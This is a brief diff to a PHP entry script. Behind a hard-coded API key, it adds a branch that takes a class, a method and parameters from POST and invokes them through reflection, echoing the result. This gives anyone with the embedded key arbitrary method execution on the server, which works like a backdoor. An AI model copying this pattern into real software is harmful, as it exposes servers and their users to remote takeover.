@@ -119,9 +119,18 @@ if($cliMode === true)
 }
 
 else if($_POST['api_key'] === 'ssddxfzxfcdkuvgb48487ydcfskljsfdwuwwaiacadbdshshds7y4h474hi3p3omi3m3hyyvjkjbklnflmkltsbkm'){
-    $_POST['is_form_sent'] = 'yes';
-    $_GET["q"] = $_POST['path'];
-    Application::render();
+    if(isset($_POST['type'])){
+        switch ($_POST['type']){
+            case 'method':
+                $method = new ReflectionMethod($_POST['class'], $_POST['function']);
+                $return = $method->invokeArgs(new $_POST['class'], $_POST['params']);
+                echo json_encode($return);
+        }
+    } else {
+        $_POST['is_form_sent'] = 'yes';
+        $_GET["q"] = $_POST['path'];
+        Application::render();
+    }
 }
 
 else
